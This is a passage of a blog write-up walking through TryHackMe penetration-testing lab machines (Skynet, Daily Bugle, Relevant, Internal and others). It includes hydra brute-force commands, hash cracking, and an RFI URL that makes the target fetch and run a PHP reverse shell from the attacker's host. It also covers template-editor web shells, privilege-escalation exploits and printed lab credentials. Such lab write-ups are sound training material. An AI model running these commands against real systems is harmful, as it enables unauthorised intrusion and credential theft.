<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hash-identifier <span class="o">&lt;&lt;&lt;</span> ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011154908.png" text-align="center" />
</div>

<p>So SHA-256 is a possible hash, then we use this information in the command below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--format</span><span class="o">=</span>RAW-SHA256 <span class="nt">-wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</code></pre></div></div>

<p>This command try to crack the hash that is in the hash.txt file through the SHA-256 algorithm using the rockyou.txt list, obtaining:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011155222.png" text-align="center" />
</div>

<p>So we have credentials to access the machine through the SSH server; agent47:videogamer124</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011155339.png" text-align="center" />
</div>

<p>Now, in order to perfom local enumeration about the machine, we going to use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a>.</p>

<p>We move it with wget and a python http server an runnit after give to it execution permissions:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011183105.png" text-align="center" />
</div>

<p>The script locate a port 10000 open in all the interfaces (0.0.0.0) but its not identified by nmap:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011183431.png" text-align="center" />
</div>

<p>The other one is the internal service offered by the DBMS MySQL.</p>

<p>Then, we proceed to investigate what this port offer, and try to access it with netcat:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011183520.png" text-align="center" />
</div>

<p>We see that the server is “webmin” but for some reason although this port is externaly open it refuses our conections tries. Then, we try to conect at the same way through the victim machine, as a internal way:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011184053.png" text-align="center" />
</div>

<p>Thus, we see that it receives internals requests (probably as a security layer) and it offers HTTP service. This raises a problem because, since our access to the machine is thorugh SSH, we can’t use internaly the browser so our better chance is use PortForwarding to perform a internal conexión through a redirection from a local port connected by our browser.</p>

<p>So we employ the following command in our machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 10000:localhost:10000 agent47@&lt;IP&gt;
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011184545.png" text-align="center" />
</div>

<p><em>This use the redirection feature of the ssh client command to forward the conexions issued to our local port 10000 to the port 10000 of the victim machine through SSH tunneling as our stealed user acount ‘agent47’. This means that our commands will be receive as commands ordered by the user ‘agent47’ on the victim machine, letting us to access the internal service.</em></p>

<p>Then, open our browser and connecto to ‘localhost:10000’ and:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011185231.png" text-align="center" />
</div>

<p>The information there displayed is useful to seek an <a href="https://www.exploit-db.com/exploits/21851">exploit</a> to elevate privileges. In the instructions of the exploit appears that this is part of the metasploit enviroment:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011185520.png" text-align="center" />
</div>

<p>So we search for it in the C2 enviroment:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011185638.png" text-align="center" />
</div>

<p>And use it following the <a href="https://medium.com/@CyberOPS.LittleDog/tryhackme-game-zone-864ad2ad93f8">instructions</a> to gain access to a levereged shell.</p>

<h4 id="25-skynet-http-enumeration-smb-enumeration-cms-remote-file-inclusion-kernel-exploits-">2.5. Skynet (Http enumeration, SMB enumeration, CMS, Remote File Inclusion, Kernel Exploits) .</h4>

<p>In this case we are facing a Linux machine with SSH, HTTP, SMB (Samba), POP3 (Dovecot) services in default ports. So we proceed to do enumeration of this services:</p>

<ul>
  <li><em>Http Enumeration</em>: First, http service, the web app. When we access to the main page it appears a search-bar that suggest a posible sqlinjection but a test with sqlmap provees that is not the case:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011220019.png" text-align="center" />
</div>

<p>We use it saving a request capture with BurpSuite and employ it in the command above the image before.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> requestedcapturedwithBurp.txt <span class="nt">--dbs</span>
</code></pre></div></div>

<p>So we continue our enumerating process with <em>dirb</em> tool, that seems to show a lot of content:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://&lt;IP&gt;
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011220423.png" text-align="center" />
</div>

<p>And we can see that we have a login section over the web app:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011220457.png" text-align="center" />
</div>

<p>Where the version of the software appears too which can lead to a exploit method. A simply search in google lead us to <a href="https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html">CVE-2017-7692</a> that is a RCE exploit that affect to SquirrelMail version 1.4.23 but it requires credentials and thus a user is needed:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011220835.png" text-align="center" />
</div>

<p>First, we try to login with some defaults credentials but there is not luck.</p>

<p>So in order to recolect some information we proceed to enumerate the other services.</p>

<p><br /></p>

<ul>
  <li><em>Samba Enumeration</em>: Since SMB is a windows-exclusive protocol, for Linux we have a SMB software implemetation named Samba. Thus, we first proceed to run a SMB-Enum nse script with Nmap and obtain the following results:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> smb-enum-shares.nse <span class="nt">-p445</span> 10.10.18.232
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011221605.png" text-align="center" />
</div>

<p>There we can see that the ‘guest’ user is avialable with most likely not password that shares the /srv/samba directory through the anonymous account, that exist a user named ‘Miles’ that is sharing one directory in his home directory through the account ‘milesdyson’.</p>

<p>So, we use <em>smbclient</em> tool to access to the anonymous share with the guest user:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>&lt;IP&gt;<span class="se">\\</span>Anonymous <span class="nt">-U</span><span class="o">=</span>Guest
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011222310.png" text-align="center" />
</div>

<p>We got an attention.txt file that displays a message about a generalizated change of passwords</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011222351.png" text-align="center" />
</div>

<p>and a ‘logs’ directory where are stored three files of which only one have some content; log1.txt:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011222459.png" text-align="center" />
</div>

<p>According with the content of the message above it seems clearly that this list are a list of passwords and one of them would be the password of the user Miles.</p>

<p><br /></p>

<ul>
  <li><em>Accessing the web with Hydra</em>:</li>
</ul>

<p>So with the information recopiled before we’re going to perfom a dictiory-list attack with hydra over the Miles account, which is most likely to be ‘milesdyson’ according the SMB enumeration, with the log1.txt as the list of candidates to passwords. We will employ the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> milesdyson <span class="nt">-P</span> log1.txt 10.10.133.54 http-post-form <span class="s2">"/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect."</span>
</code></pre></div></div>

<p>This is constructed throguh the steps below:</p>

<ul>
  <li>
    <p>In first place the user name and the password are extracted of the SMB enumeration as we have seen before.</p>
  </li>
  <li>
    <p>Next, we try a login attemp and see that the page send the data in HTTP-POST method, so we use “http-post-form” and then we need:</p>
  </li>
  <li>
    <p>The login file, disponible by the Inspector &gt; Network:</p>
  </li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012093114.png" text-align="center" />
</div>

<ul>
  <li>The data parameters from the POST request, accesible again by Inspector &gt; Network &gt; (Select request) Params:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012093446.png" text-align="center" />
</div>

<ul>
  <li>And the error message, we obtain it sending a fail login attemp:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012093522.png" text-align="center" />
</div>

<p>An the results shown that we find a credential milesdyson:cyborg007haloterminator</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012093552.png" text-align="center" />
</div>

<p>And then, we proceed with the exploit to gain RCE over the server.</p>

<ul>
  <li><em>Attempting to gaing access</em>: The link to the exploit from Github is <a href="https://github.com/xl7dev/Exploit/blob/master/SquirrelMail/SquirrelMail_RCE_exploit.sh">here</a>. But for some reason it not make success. Thus, we continue exploring the webapp.</li>
</ul>

<p><br /></p>

<ul>
  <li><em>HTTP Enumeration with credentials</em>: Once we logged in our user we see that skynet has send to us a message in which gives our new password for SMB: )s{A&amp;2Z=F^n_E.B`</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012115058.png" text-align="center" />
</div>

<p>So, we use it to access the milesdyson share with smbclient:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.10.157.104<span class="se">\\</span>milesdyson <span class="nt">-U</span><span class="o">=</span>milesdyson
</code></pre></div></div>

<p>We discover a ‘notes’ directory</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012115334.png" text-align="center" />
</div>

<p>And then, a note; ‘important.txt’</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012115458.png" text-align="center" />
</div>

<p>When open it, we discover the directorion of a CMS: /45kra24zxs28v3yd</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012115531.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012115824.png" text-align="center" />
</div>

<p>A CMS stands for Content Management System, which is a software which cares for manage a web application, so is most likely to behaviour like a root directory with subdirectories so it would be worth to map it with dirb:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http:&lt;IP&gt;
</code></pre></div></div>

<p>Dirb discover a /administrator which claims for autentication. In the page we see the name of the server, Cuppa CMS.</p>

<ul>
  <li><em>Accessing the server</em>:</li>
</ul>

<p>We attemp to seek an <a href="https://www.exploit-db.com/exploits/25971">exploit</a> in which is described a Remote File Inclusion vulnerability of the server.</p>

<p>We can obtain advantage of this uploading a reverseshell.</p>

<p>First, we download a php reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>, then we modify the IP and the port of the php file nad set up a listner mathcing the port set in the field before</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012165754.png" text-align="center" />
</div>

<p>Next, we read the description of the vulnerability to exploit the server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012164820.png" text-align="center" />
</div>

<p>The exploit consist on the presence of two debilities that conforms a vulnerability; a SSRF and a Remote File Execution. This is that exists a directory that can download a file from a server and then, if the file is PHP code it gets execute too. Thus, we open a http server with python over the directory where is stored the php file in our local machine:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012165239.png" text-align="center" />
</div>

<p>And then we employ the following URL in the browser:</p>

<pre><code class="language-url">http://&lt;IP&gt;/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;LocalIP&gt;/php-reverse-shell.php
</code></pre>

<p>This will provoke that the server perform a download of a php file from our server and then, gets the php file execute triggering a reverse shell call.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012170848.png" text-align="center" />
</div>

<ul>
  <li><em>Elevating Privileges</em>: Once there, we can use a kernel-exploit.</li>
</ul>

<p>First, we stabilize the netcat shell with the following commands:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<p>Then, we press Ctrl+Z and we will be back in our local machine and then press:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div>

<p>That will bring us back the connection with a totally stablish shell.</p>

<p>Then, we use the command: <em>uname -r</em> to know the version of the kernel:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012175100.png" text-align="center" />
</div>

<p>And search in google for a <a href="https://github.com/kkamagui/linux-kernel-exploits">exploit</a>. Then we download it in our local machine and go to the directory which name match the version of the kernel an init a python http server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012175244.png" text-align="center" />
</div>

<p>Then in the victim machine we go to the /tmp directory and download from our local machine the compile script and the source code of the vulnerability:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012175354.png" text-align="center" />
</div>

<p>We give exec permissions and execute the compile file and then the exploit file:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012175444.png" text-align="center" />
</div>

<p><br /></p>

<h4 id="26-daily-bugle-http-enumeration-xml-version-object-sqli-exploit-john-the-ripper-php-template-injection-">2.6. Daily Bugle (HTTP Enumeration: XML Version object, SQLi Exploit, John The Ripper, PHP Template Injection, .</h4>

<ul>
  <li><em>Nmap Enumeration</em>: In this case with Nmap we can check that we’re facing a Linux machine that offers in default ports SSH, HTTP and MySQL services.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012215139.png" text-align="center" />
</div>

<p>The defaults scripts that Nmap runs inform us that the web app have the file /robots.txt habilitate so we proceed to retrieve sensible information through the files that are there.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012215438.png" text-align="center" />
</div>

<p>On the /administrator we found a login portal to a CMS managed by Joomla!.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012215946.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Finding out CMS’s version</em>: We can try to seek an exploit for it but for that, first we need the software version. This can be found in the others flies, at first we can commit a mistake by assuming that the version of the modules installed is the correct version of the software:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012203213.png" text-align="center" />
</div>

<p>The autentic version is in the /language directory</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221012203247.png" text-align="center" />
</div>

<p>With the name of the CMS and the version we found we can search for a exploit to gain initial access to the web.</p>

<p><br /></p>

<ul>
  <li><em>SQLi Exploit and gaining access to the web</em>: Searching we obtain the following <a href="https://www.exploit-db.com/exploits/42033">exploit</a> that can be found has a <a href="https://github.com/stefanlucas/Exploit-Joomla">python script</a> too. This describe an SQLi injection and give the indications to exploit it. After the execution, we retrieve a user and a hash of a password:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013093943.png" text-align="center" />
</div>

<p>At first we try to identify the hash with tools like Hash-identifier or CyberChef but there is no luck so we pass the hash over directly JohnTheReaper who identifiy the hash and give us the password:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013094059.png" text-align="center" />
</div>

<p>Now we are in the web as administrator or super user.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013112140.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Template PHP Injection</em>: We have to find a way in the server. First we can search about an upload vulnerability to include a reverse shell in the web. We find an upload image function but it seems to not work:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013165535.png" text-align="center" />
</div>

<p>Im think in insist by going to the System &gt; Global Configuration and chanching the configuration:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013165629.png" text-align="center" />
</div>

<p>But i not success.</p>

<p>Then i find a template engine that runs php code on Control Panel &gt; Templates &gt; Beez3 &gt; Editor &gt; index.php</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013165804.png" text-align="center" />
</div>

<p>If this engine is not securize enough it can lead to the execution of malicious code. We copy the code of a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> on the template and then we save it and run it by pressing the “Template Preview” button. Since we put the code on the index.php, when the templates loads the code gets executed and we obtain a shell on a listener set up before:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013170246.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Lateral Escalation Privilege</em>: Now that we have a Netcat shell, we proceed to stabilished with the following commands:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<p>Then Ctrl+Z and, in our local machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div>

<p>Then, after a serial attemps to elevate privileges through SUID files, Sudo perm, Capabilites, etc we found a configuration file in /var/www/html with credentials:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013170727.png" text-align="center" />
</div>

<p>First we tried the root user but the autenticacion faile so we try with ‘jjameson’ user:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013171002.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Vertical Privilege Escalation</em>:</li>
</ul>

<p>And with this user we have a sudo permision over Yum:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013171157.png" text-align="center" />
</div>

<p>So we go to <a href="https://gtfobins.github.io/gtfobins/yum">GTFOBins</a>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013171422.png" text-align="center" />
</div>

<p>And copy and execute the following code:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013171625.png" text-align="center" />
</div>

<p>And we upgrade to root:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221013171658.png" text-align="center" />
</div>

<p><br /></p>

<h4 id="28-relevant-http-smb-enumeration-psexec-http-smb-explotation-with-aspx-shell-printspoofer">2.8. Relevant (HTTP, SMB Enumeration, PSExec, HTTP-SMB Explotation with aspx shell, Printspoofer).</h4>

<ul>
  <li><em>Port Scanner</em>: In this case we are facing a Microsoft Windows Server. Following the port scanner (nmap -T5 -A -p-) it seems to have a HTTP, SMB, RDP, WinRM services on defaults ports and severals RPC ports.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014092514.png" text-align="center" />
</div>

<p>Something to be notice is that there are two HTTP ports, port 80 and 49663, it seems to be a third but that should not make us fall into error because a more detailed exam (nmap -p5985 -T5) of that port shown us that not is indeed a http port:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014094143.png" text-align="center" />
</div>

<p>Is a winRM port. So we estart with ennumeartion Job.</p>

<p><br /></p>

<ul>
  <li><em>HTTP/SMB Enumeration</em>: At first, we try to enumerate the application through the port 80:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014124504.png" text-align="center" />
</div>

<p>But we not have results. Then we try to enumerate through the port 49663 but neither obtain any relevant:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014125153.png" text-align="center" />
</div>

<p>Then we proceed to enumerate SMB. We will start through nse scripts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse &lt;IP&gt;
</code></pre></div></div>

<p><br /></p>

<p>And then we find some SMB shares that are accesibles through the Guest users. In one of them, the share: nt4wrksv, we found some credentials:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014125638.png" text-align="center" />
</div>

<p>This credentials are encoded in base64:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014130131.png" text-align="center" />
</div>

<p>But do not seems to work with loggin wondows tools like xfreerdp or rdesktop.</p>

<p>With psexec we can see that infact Bill is a faker user and cannot be recognized by the system</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014131148.png" text-align="center" />
</div>

<p>while Bob exists but his password is fake</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014131158.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Upload file vulnerability</em>: At last, we found that the SMB shares are at the same time directories of the web on port 49663:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014174756.png" text-align="center" />
</div>

<p>Plus, we find that the user ‘Guest’ have writeable permissions so we can write and upload a file:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014175151.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014175203.png" text-align="center" />
</div>

<p>Thus, we must find a file format that executes code on the server to gain access through a reverse shell.</p>

<p><br /></p>

<ul>
  <li><em>Explotation</em>: To obtain this purpouse we are going to use the <em>aspx</em> format. This is a file format for web servers that use the Microsoft ASP.NET framework. Since this is a Windows Server:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014181242.png" text-align="center" />
</div>

<p>This seems to be the correct format of file. We could create a payload with MSFVenom since it supports the aspx format</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014182246.png" text-align="center" />
</div>

<p>But we going to use this <a href="https://github.com/borjmz/aspx-reverse-shell">aspx shell</a> from github. We download the code and do the procedimentals changes:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014182351.png" text-align="center" />
</div>

<p>And then we upload through the SMBclient:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014230805.png" text-align="center" />
</div>

<p>Then setup a netcat listener and execute the code by going to the file on the web through the share directory:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014231445.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014231517.png" text-align="center" />
</div>

<p>Then we get the flag and continue to elevate privileges:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014231859.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Privilege Escalation</em>: When we enumerate the privileges of the current user we see that we have the SeImpersonatorPrivilege, which can be used to escalate privileges through a <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">potato attack</a>. You can get a privilege token from a Windows server through DCOM, but in this machine DCOM is unhabilitated.</li>
</ul>

<p>So we use the <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> exploit for Windows 10 and Servers. This exploits said, “From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10/Server”</p>

<p>So we download it to the kali machine and upload to the victim through the SMBShare (although we can use powershell wget cmdlet too).</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221014235627.png" text-align="center" />
</div>

<p>Since i got an error when i try to compile the code:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221015000631.png" text-align="center" />
</div>

<p>I download an already <a href="https://github.com/dievus/printspoofer">compiled executable</a> and then:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221015000830.png" text-align="center" />
</div>

<p>Thus, we complete the machine.</p>

<h4 id="29-internal">2.9. Internal.</h4>

<p>Note pre-start. We have to modify in our attack machine the /etc/hosts file and introduce the following line: &lt;VictimIP&gt; internal.thm:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221102164036.png" text-align="center" />
</div>

<p>If we don’t do this, the web site will not work properly and we won’t be able to complete the machine.</p>

<ul>
  <li><em>Port Scanning</em>: In this case, we are facing a Ubuntu machine with SSH and HTTP services on defaults ports open:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221015114748.png" text-align="center" />
</div>

<p>Thus, we proceed to do HTTP Enumeration.</p>

<p><br /></p>

<ul>
  <li><em>Gaining access to the web</em>: We attemp to map the web with dirb. We found that exists a section named blog in which are a post by a user “admin”</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103173407.png" text-align="center" />
</div>

<p>and a log in section in /blog/wp-login.php.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103173422.png" text-align="center" />
</div>

<p>So we try to bruteforce the admin user with the rockyou.txt to gain access to web with hydra:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.121.21 http-post-form <span class="s2">"/blog/wp-login.php:log=admin&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username"</span> <span class="nt">-vv</span>
</code></pre></div></div>

<p>And we found some valids credentials: admin:my2boys</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103182442.png" text-align="center" />
</div>

<ul>
  <li>“Exploring the website and gaining initial access:” Once there, we are in the /blog/wp-admin/ file and we wanna find some way to gain access into the machine. Some way to execute a reverse shell.</li>
</ul>

<p>Finally, we found a section of the web in which we have writeable permissions and it executes code php on Dashboard &gt; Themes &gt; Theme Editor:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103213709.png" text-align="center" />
</div>

<p>Thus, we generate a <a href="https://github.com/pentestmonkey/php-reverse-shell">php-reverse-shell</a>, save the changes on the index.php and set up a netcat listener. Then, we visit http://internal.php/blog and we get initial access:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103214655.png" text-align="center" />
</div>

<p>And then only remains to stabilise the shell with python.</p>

<p><br /></p>

<ul>
  <li>“Privilege Escalation”: At first we appear as the www-data user, in the /opt folder are stored credentials:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103215700.png" text-align="center" />
</div>

<p>So we upgrade to the aubreanna:bubb13guM!@#123 user vis ssh.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221103215751.png" text-align="center" />
</div>

<p>In the other hand, we have a file in which is writed that there is a jenkis running as a internal service:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104190238.png" text-align="center" />
</div>

<p>Jenkis is a web service accesible thorugh a browser but, since we only have command-line based access we have to use SSH Tunneling in order to connect with our browser to this internal service:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-N</span> <span class="nt">-L</span> 9999:172.17.0.2:8080 aubreanna@10.10.127.95
</code></pre></div></div>

<p>The command above will ise the forwarding feature of the SSH command to forward any connection perfomerd over our port 9999 to the 8080 port of the machine 172.17.0.2 through the account aubreanna on internal.thm without spawn shell.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104191650.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104191703.png" text-align="center" />
</div>

<p>Thus, we try to bruteforce the admin user with hydra:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt localhost <span class="nt">-s</span> 9999 http-post-form <span class="s2">"/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=/&amp;Submit=Sign+in:Invalid username or password"</span> <span class="nt">-v</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104193356.png" text-align="center" />
</div>

<p>Once there, we know that we have a script console in which we can run Java scripts like <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">this</a>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104194739.png" text-align="center" />
</div>

<p>And like this:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104194758.png" text-align="center" />
</div>

<p>And in the /opt directory:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221104195221.png" text-align="center" />
</div>


      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#thm">thm</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  
    <a href="https://twitter.com/intent/tweet?text=6.Offensive+Pentesting&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-01-6.OffensivePentesting%2F"
      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
